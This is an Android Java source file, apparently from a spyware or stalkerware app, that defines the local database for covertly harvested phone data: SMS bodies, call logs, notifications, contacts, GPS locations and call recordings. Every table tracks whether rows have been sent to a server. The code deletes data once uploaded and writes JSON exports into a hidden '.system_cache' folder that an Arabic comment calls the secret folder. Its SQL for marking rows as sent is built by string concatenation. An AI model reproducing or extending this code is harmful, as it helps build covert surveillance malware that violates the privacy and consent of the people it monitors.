package com.alzahra.data;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String TAG = "DatabaseHelper";
    private static final String DB_NAME = "alzahra_data.db";
    private static final int DB_VERSION = 1;
    
    private final Context context;
    
    public DatabaseHelper(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
        this.context = context;
    }
    
    @Override
    public void onCreate(SQLiteDatabase db) {
        // جدول الرسائل SMS
        db.execSQL("CREATE TABLE IF NOT EXISTS sms (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "address TEXT," +
            "body TEXT," +
            "date INTEGER," +
            "type INTEGER," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // جدول المكالمات
        db.execSQL("CREATE TABLE IF NOT EXISTS calls (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "number TEXT," +
            "name TEXT," +
            "type INTEGER," +
            "date INTEGER," +
            "duration INTEGER," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // جدول الإشعارات
        db.execSQL("CREATE TABLE IF NOT EXISTS notifications (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "package_name TEXT," +
            "title TEXT," +
            "text TEXT," +
            "category TEXT," +
            "post_time INTEGER," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // جدول جهات الاتصال
        db.execSQL("CREATE TABLE IF NOT EXISTS contacts (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "name TEXT," +
            "number TEXT," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // جدول الموقع
        db.execSQL("CREATE TABLE IF NOT EXISTS location (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "latitude REAL," +
            "longitude REAL," +
            "accuracy REAL," +
            "time INTEGER," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // جدول التسجيلات
        db.execSQL("CREATE TABLE IF NOT EXISTS recordings (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT," +
            "file_path TEXT," +
            "number TEXT," +
            "duration INTEGER," +
            "time INTEGER," +
            "sent_to_server INTEGER DEFAULT 0," +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        Log.d(TAG, "Database created successfully");
    }
    
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // للتحديثات المستقبلية
    }
    
    // ═══════════════════════════════════════════
    // إضافة البيانات
    // ═══════════════════════════════════════════
    
    public long addSMS(String address, String body, long date, int type) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("address", address);
        cv.put("body", body);
        cv.put("date", date);
        cv.put("type", type);
        return db.insert("sms", null, cv);
    }
    
    public long addCall(String number, String name, int type, long date, int duration) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("number", number);
        cv.put("name", name);
        cv.put("type", type);
        cv.put("date", date);
        cv.put("duration", duration);
        return db.insert("calls", null, cv);
    }
    
    public long addNotification(String packageName, String title, String text, String category, long postTime) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("package_name", packageName);
        cv.put("title", title);
        cv.put("text", text);
        cv.put("category", category);
        cv.put("post_time", postTime);
        return db.insert("notifications", null, cv);
    }
    
    public long addContact(String name, String number) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("name", name);
        cv.put("number", number);
        return db.insert("contacts", null, cv);
    }
    
    public long addLocation(double latitude, double longitude, float accuracy, long time) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("latitude", latitude);
        cv.put("longitude", longitude);
        cv.put("accuracy", accuracy);
        cv.put("time", time);
        return db.insert("location", null, cv);
    }
    
    public long addRecording(String filePath, String number, int duration, long time) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put("file_path", filePath);
        cv.put("number", number);
        cv.put("duration", duration);
        cv.put("time", time);
        return db.insert("recordings", null, cv);
    }
    
    // ═══════════════════════════════════════════
    // جلب البيانات غير المرسلة
    // ═══════════════════════════════════════════
    
    public JSONArray getUnsentSMS() {
        return getData("sms", new String[]{"id", "address", "body", "date", "type"}, "sent_to_server = 0");
    }
    
    public JSONArray getUnsentCalls() {
        return getData("calls", new String[]{"id", "number", "name", "type", "date", "duration"}, "sent_to_server = 0");
    }
    
    public JSONArray getUnsentNotifications() {
        return getData("notifications", new String[]{"id", "package_name", "title", "text", "category", "post_time"}, "sent_to_server = 0");
    }
    
    public JSONArray getUnsentContacts() {
        return getData("contacts", new String[]{"id", "name", "number"}, "sent_to_server = 0");
    }
    
    public JSONArray getUnsentLocation() {
        return getData("location", new String[]{"id", "latitude", "longitude", "accuracy", "time"}, "sent_to_server = 0");
    }
    
    public JSONArray getUnsentRecordings() {
        return getData("recordings", new String[]{"id", "file_path", "number", "duration", "time"}, "sent_to_server = 0");
    }
    
    private JSONArray getData(String table, String[] columns, String where) {
        JSONArray result = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        
        Cursor cursor = db.query(table, columns, where, null, null, null, "id ASC", "1000");
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                try {
                    JSONObject obj = new JSONObject();
                    for (int i = 0; i < columns.length; i++) {
                        obj.put(columns[i], cursor.getString(i));
                    }
                    result.put(obj);
                } catch (Exception e) {
                    Log.e(TAG, "Error parsing data", e);
                }
            }
            cursor.close();
        }
        
        return result;
    }
    
    // ═══════════════════════════════════════════
    // تحديث حالة الإرسال
    // ═══════════════════════════════════════════
    
    public void markSMSSent(String ids) {
        markSent("sms", ids);
    }
    
    public void markCallsSent(String ids) {
        markSent("calls", ids);
    }
    
    public void markNotificationsSent(String ids) {
        markSent("notifications", ids);
    }
    
    public void markContactsSent(String ids) {
        markSent("contacts", ids);
    }
    
    public void markLocationSent(String ids) {
        markSent("location", ids);
    }
    
    public void markRecordingsSent(String ids) {
        markSent("recordings", ids);
    }
    
    private void markSent(String table, String ids) {
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL("UPDATE " + table + " SET sent_to_server = 1 WHERE id IN (" + ids + ")");
    }
    
    // ═══════════════════════════════════════════
    // حذف البيانات المرسلة
    // ═══════════════════════════════════════════
    
    public void deleteSentData() {
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL("DELETE FROM sms WHERE sent_to_server = 1");
        db.execSQL("DELETE FROM calls WHERE sent_to_server = 1");
        db.execSQL("DELETE FROM notifications WHERE sent_to_server = 1");
        db.execSQL("DELETE FROM contacts WHERE sent_to_server = 1");
        db.execSQL("DELETE FROM location WHERE sent_to_server = 1");
        db.execSQL("DELETE FROM recordings WHERE sent_to_server = 1");
        Log.d(TAG, "Sent data deleted");
    }
    
    // ═══════════════════════════════════════════
    // تصدير البيانات كملف
    // ═══════════════════════════════════════════
    
    public File exportData(String dataType) {
        try {
            JSONArray data = null;
            String fileName = null;
            
            switch (dataType) {
                case "sms":
                    data = getUnsentSMS();
                    fileName = "sms_data.json";
                    break;
                case "calls":
                    data = getUnsentCalls();
                    fileName = "calls_data.json";
                    break;
                case "notifications":
                    data = getUnsentNotifications();
                    fileName = "notifications_data.json";
                    break;
                case "contacts":
                    data = getUnsentContacts();
                    fileName = "contacts_data.json";
                    break;
                case "location":
                    data = getUnsentLocation();
                    fileName = "location_data.json";
                    break;
            }
            
            if (data == null || data.length() == 0) {
                return null;
            }
            
            // حفظ في المجلد السري
            File secretDir = new File(context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE)
                .getString("secret_path", context.getFilesDir() + "/.system_cache"));
            File exportDir = new File(secretDir, "temp");
            if (!exportDir.exists()) exportDir.mkdirs();
            
            File file = new File(exportDir, fileName);
            FileWriter writer = new FileWriter(file);
            writer.write(data.toString(2));
            writer.close();
            
            return file;
            
        } catch (Exception e) {
            Log.e(TAG, "Export error", e);
            return null;
        }
    }
    
    // ═══════════════════════════════════════════
    // إحصائيات
    // ═══════════════════════════════════════════
    
    public JSONObject getStats() {
        JSONObject stats = new JSONObject();
        SQLiteDatabase db = getReadableDatabase();
        
        try {
            stats.put("sms_count", getCount(db, "sms", "sent_to_server = 0"));
            stats.put("calls_count", getCount(db, "calls", "sent_to_server = 0"));
            stats.put("notifications_count", getCount(db, "notifications", "sent_to_server = 0"));
            stats.put("contacts_count", getCount(db, "contacts", "sent_to_server = 0"));
            stats.put("location_count", getCount(db, "location", "sent_to_server = 0"));
            stats.put("recordings_count", getCount(db, "recordings", "sent_to_server = 0"));
        } catch (Exception e) {
            Log.e(TAG, "Stats error", e);
        }
        
        return stats;
    }
    
    private int getCount(SQLiteDatabase db, String table, String where) {
        Cursor cursor = db.rawQuery("SELECT COUNT(*) FROM " + table + " WHERE " + where, null);
        int count = 0;
        if (cursor.moveToFirst()) {
            count = cursor.getInt(0);
        }
        cursor.close();
        return count;
    }
}
